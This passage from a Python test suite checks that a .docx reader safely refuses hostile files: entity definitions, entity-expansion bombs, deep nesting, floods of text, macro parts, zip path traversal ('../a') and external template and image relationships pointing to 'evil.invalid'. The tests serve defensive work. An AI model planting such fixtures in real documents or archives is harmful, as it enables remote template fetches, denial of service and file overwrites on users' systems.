            xml = HEAD + dtd + f'<w:document xmlns:w="{W}"><w:body><w:p><w:r><w:t>x</w:t></w:r></w:p></w:body></w:document>'
            self.refused(docx(document_xml=xml), "can't read safely")

    def test_a_definition_in_any_other_part_is_refused_too(self):
        xml = HEAD + '<!DOCTYPE d [<!ENTITY a "b">]>'
        for name, body in (("word/styles.xml", f'<w:styles xmlns:w="{W}"/>'), ("word/numbering.xml", f'<w:numbering xmlns:w="{W}"/>'),
                           ("word/_rels/document.xml.rels", '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>')):
            self.refused(docx(P("x"), parts={name: xml + body}), "can't read safely")
        self.refused(docx(P("x"), content_types=xml + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>'),
                     "can't read safely")

    def test_an_entity_reference_with_no_definition_is_damage(self):
        self.refused(docx(document_xml=document(P("&nothing;"))), "can't be opened")

    def test_the_five_ordinary_entities_and_character_references_read(self):
        self.assertEqual(blocks(P("a &amp; b &lt;c&gt; &quot;d&quot; &apos;e&apos; &#65;&#x42;")),
                         [{"kind": "paragraph", "text": "a & b <c> \"d\" 'e' AB"}])

    def test_a_huge_character_reference_is_damage_not_a_hang(self):
        self.refused(docx(document_xml=document(P("&#99999999999999999999;"))), "can't be opened")
        self.refused(docx(document_xml=document(P("&#1;"))), "can't be opened")

    def test_text_that_is_not_utf8(self):
        self.refused(docx(document_xml=(document(P("caf\u00e9"))).encode("latin-1")), "can't read safely")
        self.refused(docx(document_xml=(document(P("x"))).encode("utf-16")), "can't read safely")
        self.refused(docx(document_xml=b'<?xml version="1.0"?>' + b"<w:document xmlns:w='" + W.encode() + b"'><w:body><w:p><w:r><w:t>\xff\xfe</w:t></w:r></w:p></w:body></w:document>"),
                     "can't read safely")

    def test_a_declared_encoding_other_than_utf8(self):
        xml = document(P("x")).replace('encoding="UTF-8"', 'encoding="ISO-8859-1"')
        self.refused(docx(document_xml=xml), "can't read safely")
        self.assertEqual(blocks(P("x"), document_xml=document(P("x")).replace('"UTF-8"', '"utf-8"')), [{"kind": "paragraph", "text": "x"}])

    def test_a_byte_order_mark_is_fine(self):
        self.assertEqual(blocks("", document_xml=("\ufeff" + document(P("bom"))).encode("utf-8")), [{"kind": "paragraph", "text": "bom"}])

    def test_xml_cut_short_or_mangled(self):
        whole = document(P("x" * 100))
        for broken in (whole[:len(whole) // 2], whole.replace("</w:body>", ""), whole + "<extra>", "not xml at all", "<w:document>"):
            self.refused(docx(document_xml=broken), "can't be opened")

    def test_xml_nested_too_deep(self):
        deep = "<w:r>" * 200 + "<w:t>x</w:t>" + "</w:r>" * 200
        started = time.time()
        self.refused(docx(f"<w:p>{deep}</w:p>"), "can't read safely")
        self.assertLess(time.time() - started, 3)

    def test_xml_of_the_greatest_depth_allowed_reads(self):
        runs = docx_read.MAX_DEPTH - 5                 # document, body, p, r and t take five
        self.assertEqual(blocks("<w:p>" + "<w:ins>" * runs + "<w:r><w:t>x</w:t></w:r>" + "</w:ins>" * runs + "</w:p>")[0]["text"], "x")

    def test_xml_with_too_many_elements(self):
        with mock.patch.object(docx_read, "MAX_ELEMENTS", 50):
            self.refused(docx(P("x") * 100), "can't read safely")

    def test_a_flood_of_paragraphs(self):
        with mock.patch.object(docx_read, "MAX_BLOCKS", 10):
            self.refused(docx(P("x") * 11), "paragraphs and rows")
            self.assertEqual(len(blocks(P("x") * 10)), 10)

    def test_a_flood_of_text(self):
        with mock.patch.object(docx_read, "MAX_TEXT", 1000):
            self.refused(docx(P("x" * 400) * 3), "more text")

    def test_a_giant_paragraph(self):
        said = self.refused(docx(P("a" * (docx_read.MAX_PARAGRAPH + 1))), "200,000")
        self.assertIn("paragraph", said)

    def test_a_giant_paragraph_made_of_many_runs(self):
        run = "<w:r><w:t>" + "a" * 70_000 + "</w:t></w:r>"
        self.refused(docx(f"<w:p>{run * 3}</w:p>"), "200,000")

    def test_a_giant_paragraph_inside_a_table_cell(self):
        self.refused(docx(TBL(TR(TC(P("a" * (docx_read.MAX_PARAGRAPH + 1)), P("b")), "x"))), "200,000")

    def test_a_giant_hidden_paragraph_costs_nothing(self):
        self.assertEqual(blocks(P("a" * 1_000_000, hidden=True) + P("seen")), [{"kind": "paragraph", "text": "seen"}])

    def test_a_giant_paragraph_is_refused_before_it_is_built(self):
        # Counted, not timed: the work done is the characters the reader accepted into a paragraph and the ones offered to it.
        size = 5_000_000
        seen = {"offered": 0, "built": 0}
        real_add = docx_read._Body.add

        def counting_add(body, s):
            seen["offered"] += len(s)
            real_add(body, s)                          # raises once the paragraph is over the limit
            if body.para is not None:
                seen["built"] = max(seen["built"], body.para["len"])

        data = docx(P("".join(random.Random(7).choices(string.ascii_letters, k=size))))
        with mock.patch.object(docx_read._Body, "add", counting_add):
            self.refused(data, "200,000")
        self.assertLessEqual(seen["built"], docx_read.MAX_PARAGRAPH)       # nothing was built past the limit
        self.assertLess(seen["offered"], size)                              # and the rest of the text was never even read


class NothingOutsideIsTouched(Refused):
    def test_reading_opens_no_file_no_network_no_process(self):
        def no(*a, **k):
            raise AssertionError("touched something outside")

        files = [docx(P("Overview", "Heading1") + P("text") + TBL(TR("a", "b")), parts={"word/styles.xml": STYLES, "word/numbering.xml": NUMBERING}),
                 docx(document_xml=HostileXml.LOL), docx(P("x"), parts={"word/vbaProject.bin": b"x"}),
                 docx(P("x"), parts={"word/_rels/document.xml.rels": RELS.format(
                     '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                     'Target="https://evil.invalid/t" TargetMode="External"/>')}), b"not a zip"]
        import subprocess
        with mock.patch.object(builtins, "open", no), mock.patch("os.open", no), mock.patch.object(socket.socket, "connect", no), \
                mock.patch.object(socket, "create_connection", no), mock.patch.object(urllib.request, "urlopen", no), \
                mock.patch.object(subprocess, "Popen", no), mock.patch("os.system", no):
            for data in files:
                try:
                    read(data, NAME)
                except WordRefused:
                    pass

    def test_a_refusal_returns_nothing(self):
        for data in (docx(P("x"), parts={"word/vbaProject.bin": b"x"}), b"junk"):
            result = None
            try:
                result = read(data, NAME)
            except WordRefused:
                pass
            self.assertIsNone(result)


class Messages(Refused):
    def test_every_refusal_is_plain_and_names_the_file(self):
        cases = [b"junk", docx(P("x"), parts={"word/vbaProject.bin": b"x"}), docx(P("x"), parts={"word/embeddings/a.bin": b"x"}),
                 docx(document_xml=HostileXml.LOL), docx(skip=("word/document.xml",)),
                 docx(P("x"), parts={"word/_rels/document.xml.rels": RELS.format(
                     '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" '
                     'Target="https://evil.invalid/p" TargetMode="External"/>')}),
                 docx(P("a" * 200_001)), b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 600,
                 docx(P("x"), parts={"word/media/a.bin": b"\0" * (21 * 1024 * 1024)}),
                 zipped([("../a", b"x")]), zipped([("a", b"x"), ("a", b"x")]), docx(P("x"), parts={f"c/{i}.xml": "<a/>" for i in range(250)})]
        said = set()
        for data in cases:
            said.add(self.refused(data, name="Quarterly review.docx"))
        self.assertGreaterEqual(len(said), 10)         # different causes, different words
        for s in said:
            self.assertTrue(s.endswith(".") and s[0].isupper() or s.startswith("A paragraph"), s)
            self.assertFalse(s.lower().startswith(("insert", "update", "delete")), s)


if __name__ == "__main__":
    unittest.main()
